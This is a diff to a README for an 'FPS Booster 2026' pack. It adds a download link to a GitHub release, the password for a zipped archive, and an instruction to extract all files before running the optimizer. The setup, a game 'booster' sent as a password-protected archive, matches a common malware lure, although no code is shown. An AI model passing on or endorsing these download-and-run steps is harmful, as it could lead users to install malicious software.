@@ -17,10 +17,14 @@
 
 1 -  Download the Pack
 
-Go to the **[Releases](link_release)** section (on the right side of this page).
+Go to the **[Releases]([link_release](https://github.com/meller223/FPS-BOOST-2026/releases/tag/fps))** section (on the right side of this page).
 Download the latest archive: `FPS_Booster_2026.zip`.
 
 2 - Unzip & Prepare
+
+Extract the archive to your Desktop or any folder.
+*   **Archive Password:** `Wsdoufpsboost22025`
+*   *Note: You must extract all files for the program to work.*
 
 3 - Run the Optimizer
 
